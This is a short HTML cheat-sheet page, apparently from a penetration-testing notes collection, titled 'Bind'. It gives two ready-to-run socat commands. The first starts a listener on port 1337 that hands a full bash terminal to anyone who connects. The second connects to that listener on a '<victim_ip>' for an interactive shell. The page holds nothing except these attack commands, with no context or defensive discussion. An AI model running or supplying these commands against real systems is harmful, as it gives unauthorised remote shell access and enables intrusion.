<title>Bind</title>
</head><body>Bind shell<br/>
<br/>
Set listener:<br/>
socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane<br/>
<br/>
Connect to the listener:<br/>
socat FILE:`tty`,raw,echo=0 TCP:&lt;victim_ip&gt;:1337</body></html>
